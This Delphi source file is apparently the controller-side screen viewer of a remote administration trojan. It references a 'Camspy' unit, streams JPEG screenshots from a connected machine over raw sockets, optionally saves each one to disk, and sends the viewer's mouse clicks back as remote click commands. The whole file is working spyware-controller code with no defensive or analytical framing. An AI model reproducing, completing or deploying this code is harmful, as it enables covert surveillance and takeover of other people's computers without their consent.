unit uScreenNor;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, ExtCtrls,winsock,jpeg;

type
  TForm12 = class(TForm)
    stat1: TStatusBar;
    pb1: TProgressBar;
    img1: TImage;
    chk1: TCheckBox;
    TrackBar1: TTrackBar;
    lbl1: TLabel;
    chk2: TCheckBox;
    PngBitBtn1: TBitBtn;
    Label1: TLabel;
    Label2: TLabel;
    UpDown1: TUpDown;
    procedure PngBitBtn1Click(Sender: TObject);
    procedure FormResize(Sender: TObject);
    procedure img1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure UpDown1Click(Sender: TObject; Button: TUDBtnType);
  private
    { Private declarations }
  public
    { Public declarations }
    sRatio:extended;
    sSRation:integer;
    sWidth:integer;
    sHeight:integer;
    sForm:TObject;
    procedure ProcessData;
  end;

var
  Form12: TForm12;

implementation

uses uCamspy,uConn;

{$R *.dfm}

procedure TForm12.PngBitBtn1Click(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
if PngBitBtn1.Caption = 'Start' then begin
if Stat1.Panels[2].Text = '0' then begin
     Data := '50|' + Stat1.Panels[0].Text + #10;
     Sock := StrToInt(Stat1.Panels[0].Text);
     Send(Sock, Data[1], Length(Data), 0);
     Label2.Enabled := false;
    pb1.Enabled := false;
    img1.Enabled := false;
    chk1.Enabled := false;
    TrackBar1.Enabled := false;
    chk2.Enabled := false;
    UpDown1.Enabled := false;
    Label1.Enabled := false;
    lbl1.Enabled := false;
    pngbitbtn1.Enabled := false;
    exit;
end;
  Data := 'SEND' + inttostr(ssRation) + '|' + inttostr(trackbar1.Position) + '|' +#10;
  Sock := StrToInt(Stat1.Panels[2].Text);
  Send(Sock, Data[1], Length(Data), 0);
  PngBitBtn1.Caption := 'Stop';
end else begin
  closesocket(StrToInt(Stat1.Panels[2].Text));
  Stat1.Panels[2].Text := '0';
  PngBitBtn1.Caption := 'Start';
  Label2.Enabled := false;
  pb1.Enabled := false;
  img1.Enabled := false;
  chk1.Enabled := false;
  TrackBar1.Enabled := false;
  chk2.Enabled := false;
  UpDown1.Enabled := false;
  Label1.Enabled := false;
  lbl1.Enabled := false;
end;
end;

procedure TForm12.ProcessData;
var
  Len:integer;
  Buffer: Array[0..1000] Of Char;
  rFile:Array[0..8000] Of Char;
  Data,t:string;
  myTempStream:Tmemorystream;
  Transferedsize,Bytessize,mysize,total,derr:integer;
  sJPG:TJpegimage;
  sStrList:tstringlist;
  i:integer;
  sFileNamez:string;
label
  lol;
begin
myTempstream := Tmemorystream.Create;
sJPG := tjpegimage.Create;
Repeat
  Len := Recv(StrToInt(Stat1.Panels[2].Text),Buffer, SizeOf(Buffer), 0);
  If (Len <= 0) Then break;
  Data := String(Buffer);
  ZeroMemory(@Buffer, SizeOf(Buffer));
  if (Copy(data,1,3) = '130') then begin
    mytempstream.Clear;
    delete(data,1,3);
    mysize := strtoint(copy(data,1,pos('|',data) - 1));
    pb1.Position := 0;
    pb1.Max := mysize;
    stat1.Panels.Items[3].Text := 'Size: ' + inttostr(mysize) + ' Bytes';
    TransferedSize := 0;
    BytesSize := 0;
    T := 'ok';
    if mysize < 20 then begin
      messagebox(Form12.Handle,Pchar('Error!'),Pchar('ERROR!'),0);
      break;
    end;
    If (BytesSize < mysize) Then Begin
      Total := 1;
      Repeat
        FillChar(rFile, SizeOf(rFile), 0);
        dErr := Recv(StrToInt(Stat1.Panels[2].Text), rFile, SizeOf(rFile), 0);
        If dErr = -1 Then goto lol;
        if mysize < (derr + total) then begin
          MyTempStream.Write(rFile,mysize - total + 1);
          Inc(Total, derr);
        end else begin
          Inc(Total, dErr);
          MyTempStream.Write(rFile,dErr);
        end;
        pb1.Position := total;
        TransferedSize := Total;
      Until (Total >= mySize);
    end;
    mytempstream.Position := 0;
    try
      sjpg.LoadFromStream(mytempstream);
      img1.Picture.Assign(sjpg);
      if chk1.Checked then begin
        repeat
          sFileNamez := datetostr(date) + ' ' + StringReplace(timetostr(time), ':', '-' ,[rfReplaceAll, rfIgnoreCase]) + ' ' + RandomPassword(3);
          Sleep(1);
        until FileExists(GetPath + sFileNamez + '.jpg') = false;
        sjpg.SaveToFile(GetPath + sFileNamez+ '.jpg');
      end;
    except
  end;
  lol:
  sleep(200);
  sleep(updown1.Position * 1000);
  T := 'SEND' + inttostr(ssRation) + '|' + inttostr(trackbar1.Position) + '|';
  Send(StrToInt(Stat1.Panels[2].Text), t[1], length(t), 0);
  end;
until 1=2;
Stat1.Panels[2].Text := '0';
myTempstream.Free;
sjpg.Free;
end;

procedure TForm12.FormResize(Sender: TObject);
var
  s:extended;
begin
if sWidth = 0 then exit;
if sHeight = 0 then exit;
if sRatio = 0 then exit;
tform12(sForm).width := trunc(sRatio * (img1.height ));
s :=  ((img1.height) /sheight );
s := s * 100;
sSRation := trunc(s);
end;

procedure TForm12.img1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  m1:integer;
  m2:integer;
  sock:tSocket;
  s:extended;
Data:string;
begin
  if chk2.Checked then
  begin
    m1 := (x * sWidth) div img1.Width ;
    m2 := (y * sHeight) div img1.Height;

    if button = mbLeft then begin
     Data := '120|' + IntToStr(m1) +  '|' +IntToStr(m2) +'|' + #10;
      Sock := StrToInt(Stat1.Panels[0].Text);
      Send(Sock, Data[1], Length(Data), 0);
     end else begin
      Data := '121|' + IntToStr(m1) +  '|' +IntToStr(m2) +'|' + #10;
      Sock := StrToInt(Stat1.Panels[0].Text);
      Send(Sock, Data[1], Length(Data), 0);
    end;
  end;
end;

procedure TForm12.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  closesocket(StrToInt(Stat1.Panels[2].Text));
  PngBitBtn1.Caption := 'Start';
end;

procedure TForm12.UpDown1Click(Sender: TObject; Button: TUDBtnType);
begin
label2.Caption := inttostr(updown1.Position);
end;

end.
